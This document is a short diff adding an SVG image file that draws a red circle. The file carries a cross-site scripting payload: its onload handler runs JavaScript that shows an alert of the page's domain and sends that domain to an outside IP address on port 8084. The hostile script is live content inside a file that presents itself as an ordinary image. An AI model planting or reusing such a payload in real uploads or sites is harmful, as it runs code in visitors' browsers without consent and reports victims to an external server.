@@ -1,0 +1,1 @@
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(String(document.domain));fetch(&quot;http://62.171.145.137:8084/hit?d=&quot;+encodeURIComponent(document.domain))"><circle cx="10" cy="10" r="9" fill="red"/></svg>
